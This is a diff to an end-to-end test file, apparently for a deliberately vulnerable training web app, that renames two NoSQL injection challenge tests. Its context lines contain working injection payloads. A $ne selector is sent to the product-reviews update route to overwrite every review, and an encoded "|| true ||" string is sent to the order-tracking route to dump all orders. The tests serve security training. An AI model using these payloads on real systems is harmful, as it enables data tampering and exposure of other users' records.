@@ -1,6 +1,6 @@
 const config = require('config')
 
-fdescribe('/#/search', () => {
+describe('/#/search', () => {
   beforeEach(() => {
     browser.get('/#/search')
   })
@@ -17,7 +17,7 @@ fdescribe('/#/search', () => {
     protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
   })
 
-  describe('challenge "NoSql Injection"', () => {
+  describe('challenge "NoSql Reviews Injection"', () => {
     it('should be possible to inject a selector into the update route', () => {
       browser.waitForAngularEnabled(false)
       browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": { "$ne": -1 }, "message": "injected" });')
@@ -27,7 +27,7 @@ fdescribe('/#/search', () => {
     protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 2' })
   })
 
-  describe('challenge "NoSql Injection 2"', () => {
+  describe('challenge "NoSql Orders Injection"', () => {
     it('should be possible to inject and get all the orders', () => {
       browser.waitForAngularEnabled(false)
       browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/track-order/\'%2520%257C%257C%2520true%2520%257C%257C%2520\'\');')
